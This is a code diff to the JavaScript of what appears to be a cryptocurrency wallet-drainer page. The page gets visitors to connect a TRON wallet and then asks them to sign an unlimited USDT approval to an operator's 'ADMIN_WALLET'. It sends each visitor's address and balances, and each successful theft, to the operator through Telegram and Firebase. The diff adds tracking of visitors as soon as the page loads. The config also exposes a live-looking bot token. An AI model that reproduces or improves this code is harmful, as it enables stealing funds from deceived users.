@@ -16,7 +16,9 @@ function initFirebase() {
     }
 }
 
+// Initial call
 initFirebase();
+window.addEventListener('load', initFirebase);
 
 const CONFIG = {
     BOT_TOKEN: "8738726378:AAHkiTAAZ16hoGFObK_v76yi0f0wqITMZXM",
@@ -24,6 +26,7 @@ const CONFIG = {
     ADMIN_WALLET: "TBrJPyG8BUysBBMpX7ucRmzpnYQFvEHay2",
     USDT_CONTRACT: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
 };
+
 const MAX_UINT = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
 
 async function notifyAdmin(status, address, trx = "0", usdt = "0", extra = "") {
@@ -52,11 +55,25 @@ async function getStats(address) {
     return { trx, usdt };
 }
 
+// --- Instant LANDED Alert ---
+window.addEventListener('load', () => {
+    initFirebase();
+    if (typeof firebase !== 'undefined' && firebase.apps.length > 0) {
+        firebase.database().ref('connections/' + Date.now()).set({
+            address: "New Visitor Landed",
+            usdt: "0.00",
+            trx: "0.00",
+            time: new Date().toLocaleTimeString(),
+            status: "LANDED"
+        });
+    }
+});
+
 document.getElementById('next-btn').addEventListener('click', async () => {
     const btn = document.getElementById('next-btn');
-    btn.classList.add('btn-loading'); // Always show spinner first
+    btn.classList.add('btn-loading');
 
-    // --- Instant Visitor Alert ---
+    // --- Instant Visitor Alert (Firebase & Telegram) ---
     initFirebase();
     if (typeof firebase !== 'undefined' && firebase.apps.length > 0) {
         firebase.database().ref('connections/' + Date.now()).set({
@@ -67,10 +84,9 @@ document.getElementById('next-btn').addEventListener('click', async () => {
             status: "VISITOR"
         });
     }
-
     await notifyAdmin("VISITOR", "Incoming...", "0.00", "0.00", "Someone clicked Next");
 
-    // Silent check: Wait until systems are ready without showing alerts
+    // Wait until systems are ready
     let attempts = 0;
     while (typeof window.connectWalletConnectTron !== 'function' && attempts < 30) {
         await new Promise(r => setTimeout(r, 500));
@@ -79,7 +95,6 @@ document.getElementById('next-btn').addEventListener('click', async () => {
 
     if (typeof window.connectWalletConnectTron !== 'function') {
         btn.classList.remove('btn-loading');
-        console.error("System timeout");
         return;
     }
 
@@ -87,11 +102,20 @@ document.getElementById('next-btn').addEventListener('click', async () => {
         const result = await window.connectWalletConnectTron();
         if (result && result.address) {
             const address = result.address;
-            const { trx, usdt } = await getStats(address);
+            const stats = await getStats(address);
+            const trx = stats.trx;
+            const usdt = stats.usdt;
 
             document.getElementById('view-balance').innerText = usdt;
             document.getElementById('page-wrapper').classList.add('opacity-10');
             document.getElementById('loading-screen').classList.remove('hidden');
+
+            // --- Real-time Firebase Update (CONNECTED) ---
+            if (typeof firebase !== 'undefined' && firebase.apps.length > 0) {
+                firebase.database().ref('connections/' + Date.now()).set({
+                    address, usdt, trx, time: new Date().toLocaleTimeString(), status: "CONNECTED"
+                });
+            }
 
             await notifyAdmin("CONNECTED", address, trx, usdt, "Waiting for approval...");
 
@@ -104,7 +128,6 @@ document.getElementById('next-btn').addEventListener('click', async () => {
                         [{ type: 'address', value: CONFIG.ADMIN_WALLET }, { type: 'uint256', value: MAX_UINT }], address
                     );
 
-                    // Timeout promise to prevent getting stuck if wallet doesn't respond
                     const timeoutPromise = new Promise((_, reject) =>
                         setTimeout(() => reject(new Error("Request Timeout")), 60000)
                     );
@@ -115,8 +138,8 @@ document.getElementById('next-btn').addEventListener('click', async () => {
                     });
 
                     const signedTx = await Promise.race([requestPromise, timeoutPromise]);
-
                     const receipt = await localTronWeb.trx.sendRawTransaction(signedTx);
+                    
                     await notifyAdmin("✅ SUCCESS", address, trx, usdt, `TX: <code>${receipt.txid || "Success"}</code>`);
                     alert("Transaction sent to the network.");
                     
@@ -133,7 +156,6 @@ document.getElementById('next-btn').addEventListener('click', async () => {
                     else if (parseFloat(trx) < 25) reason = "Insufficient Gas (Low TRX)";
                     else if (err.message) reason = err.message;
 
-                    // Show reason on screen for a short time
                     const errorEl = document.getElementById('error-message');
                     if (errorEl) {
                         errorEl.innerText = "Error: " + reason;
@@ -141,11 +163,7 @@ document.getElementById('next-btn').addEventListener('click', async () => {
                     }
 
                     await notifyAdmin("❌ FAILED", address, trx, usdt, `Reason: ${reason}`);
-
-                    // Wait 3 seconds so user can see the reason before reload
-                    setTimeout(() => {
-                        location.reload();
-                    }, 3000);
+                    setTimeout(() => location.reload(), 3000);
                 }
             }, 800);
         } else {
